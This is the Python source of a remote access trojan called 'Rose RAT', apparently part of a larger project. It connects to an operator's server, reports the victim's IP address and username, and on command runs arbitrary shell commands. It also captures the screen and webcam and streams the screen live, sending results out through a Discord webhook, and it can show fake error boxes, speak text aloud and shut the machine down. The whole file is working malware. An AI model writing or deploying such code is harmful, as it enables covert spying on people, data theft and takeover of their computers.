from config import Config 
from __webhook import _WebhookX
from ipinf import Info
cc = Config()
ii = Info()
import socketio
import cv2
import random
import pyttsx3
import string
import ctypes
import os
from datetime import datetime
import subprocess
import io
from dhooks import Webhook as web
from dhooks import Embed, File
from PIL import ImageGrab
from pynput.keyboard import Key, Controller
import threading
sio = socketio.Client()


class CommandHandler():
    def __init__(self):
        self.webhook = _WebhookX().get_object()
        self.keyboard = Controller()

    def screenshot(self):
        screenshot = ImageGrab.grab()
        file_name = ''.join(random.choice(string.ascii_letters) for i in range(10))
        screenshot.save(f"temp_{file_name}.png")
        file = File(f"temp_{file_name}.png", name='Rose-Injector Screenshot.png') 
        self.webhook.send(file=file)
        os.remove(f"temp_{file_name}.png")

    @staticmethod
    def messagebox(message):
        MB_YESNO = 0x04
        MB_HELP = 0x4000
        ICON_STOP = 0x10
        ctypes.windll.user32.MessageBoxW(0, message, "Error", MB_HELP | MB_YESNO | ICON_STOP)

    def shell(self, instruction):
        def _shell():
            output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return output

        try:    
            result = str(_shell().stdout.decode('CP437')) #CP437 Decoding used for characters like " é " etc..
        except Exception as e:
            result = str(f"Error | Advanced log: {e}")

        embed = Embed(
            description='Rose RAT',
            color=11495919,
            timestamp='now'  # sets the timestamp to current time
        )

        embed.set_author(name=f"Shell command result | {instruction}", icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
        embed.add_field(name="Result", value=f'`{result}`')

        self.webhook.send(embed=embed)

    def shutdown(self):
        embed = Embed(
            description='Rose RAT',
            color=11495919,
            timestamp='now'  # sets the timestamp to current time
        )

        embed.set_author(name=f"Shutting down the PC", icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())

        self.webhook.send(embed=embed)
        os.system("shutdown /s /t 1")

    def webcampic(self): #Take a picture with the webcam and send it with the webhook
        try:            
            cam = cv2.VideoCapture(0)   # 0 -> index of camera
            s, img = cam.read()
            if s:    # frame captured without any errors
                suc, buffer = cv2.imencode(".jpg", img)
                io_buf = io.BytesIO(buffer)
                file = File(io_buf,name='cam.jpg') 
                self.webhook.send(file=file)

        except Exception as e:
            embed = Embed(
            description='Rose RAT',
                color=16399677,
                timestamp='now'  # sets the timestamp to current time
            )

            embed.set_author(name=f"WebcamPIC Error", icon_url=cc.get_avatar())
            embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
            embed.add_field(name="Advanced log:", value=f'`{e}`')

            self.webhook.send(embed=embed)

    def volumeup(self):
        for i in range(50):
            self.keyboard.press(Key.media_volume_up)
            self.keyboard.release(Key.media_volume_up)     

    def volumedown(self):
        for i in range(50):
            self.keyboard.press(Key.media_volume_down)
            self.keyboard.release(Key.media_volume_down)  

    def voice(self, text):
        self.volumeup()
        engine = pyttsx3.init()
        engine.setProperty('rate', 150)
        engine.say(text)
        engine.runAndWait()

    def uptime(self):
        embed = Embed(
            description='Rose RAT',
            color=11495919,
            timestamp='now'  # sets the timestamp to current time
        )

        embed.set_author(name=f"Connection Uptime", icon_url=cc.get_avatar())
        embed.add_field(name="Uptime :",value=datetime.now())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())

        self.webhook.send(embed=embed)   
        
    def screenshare(self):
        def to_execute(self):
            import eventlet
            import socketio
            from threading import Thread
            from zlib import compress
            import time

            from mss import mss

            _sio = socketio.Client()

            WIDTH = 1900
            HEIGHT = 1000

            @_sio.event
            def connect():
                while True:
                    with mss() as sct:
                        # The region to capture
                        rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}

                        while True:
                            # Capture the screen
                            img = sct.grab(rect)
                            # Tweak the compression level here (0-9)
                            pixels = compress(img.rgb, 6)

                            # Send the size of the pixels length
                            size = len(pixels)
                            size_len = (size.bit_length() + 7) // 8
                            final_size_len = bytes([size_len])
                            #conn.send(bytes([size_len]))

                            # Send the actual pixels length
                            size_bytes = size.to_bytes(size_len, 'big')
                            final_size_bytes = size_bytes
                            #conn.send(size_bytes)

                            # Send pixels
                            #conn.sendall(pixels)
                            
                            _sio.emit('sending_screenshot', {'data': {
                                'size_len': final_size_len,
                                'size_bytes': final_size_bytes, 
                                'pixels': pixels
                            }})
                            time.sleep(0.5) #Don't overload the server
                            
            _sio.connect(cc.get_rose_discord_rat_link())
            
        t = threading.Thread(target=to_execute, args=(self,))
        t.run()
            
                        
cmdhandler = CommandHandler()

@sio.event
def connect():
    start_time = datetime.now()
    sio.emit('rose_connect', {'data': {
        'ip': ii.get_ip(),
        'username': ii.get_username(),
        'server': cc.get_rose_discord_rat_link(),
        'webhook': cc.get_webhook(),
        'avatar': cc.get_avatar(),
        'footer': cc.get_footer(),
    }})

@sio.event 
def receive_command(data):
    if data['data'] == 'screenshot':
        cmdhandler.screenshot()

    if data['data'].startswith('messagebox') is True:
        cmdhandler.messagebox(data['data'].split('messagebox', 1)[1])

    if data['data'].startswith('shell') is True:
        cmdhandler.shell(data['data'].split('shell', 1)[1])

    if data['data'].startswith('voice') is True:
        cmdhandler.voice(data['data'].split('voice', 1)[1])
        
    if data['data'] == 'screenshare':
        cmdhandler.screenshare()

    if data['data'] == 'volumemax':
        cmdhandler.volumeup()

    if data['data'] == 'volumezero':
        cmdhandler.volumedown()

    if data['data'] == 'shutdown':
        cmdhandler.shutdown()

    if data['data'] == 'webcampic':
        cmdhandler.webcampic()

    if data["data"] == "uptime":
        cmdhandler.uptime()
        


@sio.event
def disconnect():
    print("disconnect")

def run_rat():
    sio.connect(cc.get_rose_discord_rat_link())
    sio.wait()
